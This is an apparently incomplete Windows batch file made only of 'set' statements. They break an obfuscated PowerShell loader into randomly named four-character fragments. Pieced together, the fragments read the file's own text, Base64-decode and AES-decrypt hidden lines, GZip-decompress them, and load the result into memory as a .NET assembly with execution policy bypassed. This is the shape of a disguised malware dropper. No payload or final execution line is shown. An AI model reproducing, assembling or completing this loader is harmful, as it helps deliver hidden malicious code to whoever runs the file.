@echo off
set "xCFMCRhSFZ=('%*'"
set "DvhRfpnaDS=qlz "
set "jRHDNmrCAg=stem"
set "BEhMGHcQGB=brea"
set "TRUTFLnwWb=S46e"
set "bobIscgTtv=-joi"
set "yqZyBUeLnA=Iuz "
set "SnhXlJcRNM=V = "
set "RWJChEteMX=736u"
set "naITQESXxX=:('g"
set "wdZrKlTNAc= '')"
set "gjoQbYVyFP=CuW."
set "dNSAQLZZFA=ke($"
set "ZcEtFpqpPD=e]::"
set "rSIoiXwIgM=y.Ci"
set "UKtVnNlTQv=$VvC"
set "iomGfZsbsh=1..-"
set "qiqKMyBkhE=ress"
set "pDcNBCSwjQ=hy.A"
set "DOpCqVOYAG=);$Z"
set "QDdGiNFNjM=ZYYc"
set "YkbTlLQEdH=('%~f0'"
set "UgJOjlJiBc=oHg."
set "UYSdNnLaDX=.Con"
set "WgXvVRDDAN=RnMf"
set "eBgjlbBAsV=[Env"
set "HamLLFlqPT=ionM"
set "vkYkYdoWjr=);$A"
set "kSSsyctHMf=Syst"
set "evwEnWBBCD=RnMf"
set "ykcLDzNKcB=and "
set "yeaWUTUAyD=sGUc"
set "KfmHLsQcwC=);$A"
set "wTsrHjrFrq=ay()"
set "HqlncPnUmt=Comp"
set "IaSsWPaxJp=pher"
set "uHQeVIwlid=7Yiv"
set "JRSCLIAxAu=oryS"
set "MJbljhRGGL=esFX"
set "wtadmDlVck=oLHw"
set "mYKfNIFchD= if "
set "GEvNNgdsIr=iron"
set "RAUexawxAT=RnMf"
set "RrnrpnVKHW=($bs"
set "PkrktZkIwJ='')("
set "kxQfQkvsmX=z.En"
set "xWrLTpNJmH=embl"
set "xkMlZQuQLl=;$xL"
set "SGwyJgQLWU=ecry"
set "CGorbxhGgS=JaOd"
set "TqSVGCMVlh=.IO."
set "COwrOIMekJ=] -j"
set "jYymvBlGrH=.Mem"
set "xAyNLvBdBm=y.Pa"
set "dEbJDlHPyH=Fo7l"
set "uzzatYueCk=in $"
set "InEFfTGOwS=pose"
set "poKVcdoyHE=('da"
set "cldqQGyGnP=ect "
set "DKgWmOdGKB=.Cre"
set "OOriwCTEgs=..-1"
set "PPRyUWknZU=grap"
set "mqipjzYoYh=ach "
set "wEANAYvqMe=)($h"
set "uRayNLYFqs=e = "
set "lBvlOkFRQU=..-1"
set "RaflnniHrF='dqR"
set "kVtCREXaCS=pres"
set "iNyivfHuOX=[]] "
set "aztMkupbbh=Hw ="
set "gBBsECFqxo=hxTa"
set "ZaUJebFZQI=);$z"
set "yJIAUkjKZe=p = "
set "clYlPHpXwF=mJIu"
set "YXzJTgniYx= [st"
set "hZOdZqpCZF= '')"
set "FqncUgEzPV=pDZz"
set "WNrdLUYReE=ert]"
set "kzokGpuImf=  $z"
set "HrXrftzETJ= = $"
set "WSSjXQiavL=nage"
set "PnmfXwKTQL=.Mod"
set "kVVRlRzYrp=gnir"
set "wVHlcNgKGH='[-1"
set "kJYiDfjJqI=comm"
set "EgIXhmFIKm=ARnM"
set "akfxUmgWgu=se()"
set "EbeUxjVUpG=ion."
set "rgqUmmHOCj=Mf.I"
set "FnbPGfMVEP= [Sy"
set "ecuvFzbGQU=bjec"
set "esffbksMBI=m.IO"
set "MNebbUqjIA=RnMf"
set "VzJmvRVZJE=th('"
set "TsFFOQGsOs=ode]"
set "PKvGvswlXO=UGTu"
set "QmQJyZnsOc=ptog"
set "hgnzpvtivR=yste"
set "gmtyhYwGAL=('l0"
set "DSbgwLNHUL=-ep "
set "IIMXDyFXoM=ptor"
set "aAMdWpwIep=vj0m"
set "nZGnaLznPH=vert"
set "chRNdExshQ=d;$A"
set "pDtLKGEyFt=ne);"
set "yWhTqJryCY=.Cry"
set "wSlOEcgHAM=oint"
set "GPgpgpzVMM= = $"
set "uKzCVPULPH=tem."
set "JhjFAGpTSs=m.IO"
set "lJDantMdoS=ring"
set "eJbgZYkulR=oin "
set "SaZfLThDkd=ct S"
set "bEYgovgPnf=[-1."
set "CkyxNmtqKI===')"
set "BzMjBbavvq=ap ="
set "CrMSdmFaNg=.Sec"
set "wHycbqvcLl=xTap"
set "tOtnSdRUwh=z.Su"
set "jNRNiSoGTR=$hxT"
set "PeUHXIEtJB=Star"
set "fZlHGXDBAB=]::C"
set "lXbrUXnHmg=hxTa"
set "SPsuXbhXbU=esMa"
set "fcEIBhwxKh=RnMf"
set "jjorusdUZz=bsql"
set "eEGQhDexwx=7;$A"
set "aCHKUPLxOk=Stre"
set "NMrUSkoCMn=;$Oo"
set "rLGAHzwoCz=0O+g"
set "DTLchuFeLS=ew-O"
set "rWRPMjPDEW= New"
set "cBhxLSCXen=bstr"
set "EzBXWuDCXM=Comp"
set "KoMztNdVBf=ck($"
set "CQgyjImiBh=.Cop"
set "JBafsMILKs=)) {"
set "lkzgjnLSKB=Hw.T"
set "MmzGCGLeWB=em.I"
set "yeIASdDQSM=+hAO"
set "iQnVRuwNmb= = ["
set "RMFODBlZcc=p, 0"
set "zPbiiiVysZ==');"
set "vkOOrtzgVW=tem."
set "fRTENovgid='txe"
set "FhsCtJHJXU=-1.."
set "rtzPfotYMV=rtS4"
set "XgYtDvgUyp=xLcn"
set "XCxYVEDrnU=raph"
set "zcmhBepjAq=x = "
set "uZzPCKvbee='[-1"
set "xQmacafASL=PKCS"
set "nWyQdojCqG=;$mJ"
set "cbyghJufks=)))"
set "JbFEaHuTvu=isfL"
set "jaaBZEnQlq=comp"
set "eSWYNOXsyf=bypa"
set "xoKtHJPkMY=f.Pa"
set "gaILqEOZxD=raph"
set "zDXpxUlRHA=em.C"
set "hHzJKwJJFF=ewLi"
set "USydLlIcXo=$hxT"
set "nBMQYLLZKT=New-"
set "oktPjGHvYp=.Key"
set "PPClDhTMkt=]::N"
set "LipOjTgJRO=mory"
set "dIrQxwbIPS=$OoC"
set "neTquwOohu=woHg"
set "OHCygqjxEs=null"
set "ZTvptgACdm=Fx.D"
set "cVygAvUOuH=ul ="
set "PnjjxuwGcr=.Com"
set "kWKnuBTyIq=yTo("
set "KOPZBHuExc=ni, "
set "lyWhMiSlHH=ddin"
set "cAlYNITLcx=tS46"
set "jEgLfCtMck=nirt"
set "QgPLICaPro=k; }"
set "uYEgHlPNWd=cni."
set "vkPOpxfAzM=F'[-"
set "HoJzFSpbZr=Obje"
set "QQODWDqtKr=ing("
set "EiCgdiVhCs=n ''"
set "pavsFCTwoF= = N"
set "KLhFAnEhdi=-joi"
set "CEmbtWJecf=BC;$"
set "JaVwvIiREq=).Sp"
set "vkePJVHDvQ=orF'"
set "eKlJxopHTa=ose("
set "kXKiPuLNVp=rans"
set "ulJITyjzWi=i = "
set "CjOCxtQFVy=ispo"
set "RLNNPDcRNE=daeR"
set "bQghpaxbcA=rity"
set "iUZQiPOXuh=Disp"
set "iecACmvQBW=($bs"
set "bJWYDvPFEv=t Sy"
set "ANpBsvrbqh=rt]:"
set "XSOrGEavad=3HWs"
set "FxkRNISsZN=, $h"
set "woZsjvYEtN=.Dis"
set "uAbmJapDyI=OyzA"
set "XsJQSssIac=p = "
set "zudLwiQmYB=qlz."
set "MvCSpRFotN=6] -"
set "VIygpoiBMT=onve"
set "DNMsaeXrXO=tsWi"
set "qDqlcfTUQN=m.Re"
set "FxPKILGvcF=uW.T"
set "nZPHSApcUQ=stem"
set "vHbqLSfevz=esaB"
set "NykeZnucES=; };"
set "wQHGmzUUeA=sion"
set "CLDaHqGkHD=();$"
set "BeTyAIlKQb=gth)"
set "uzseLsaVUN=ress"
set "fvBDJFfrHo=hxTa"
set "mDtEHxjzuw=join"
set "ZfVhSEzjtH=ddin"
set "WEStAACZih=Fina"
set "yRtTjDGlTy=form"
set "POcAZZTNnb=ptog"
set "rvavtZeHyk=.-16"
set "ABCBQPTRnD=$xLc"
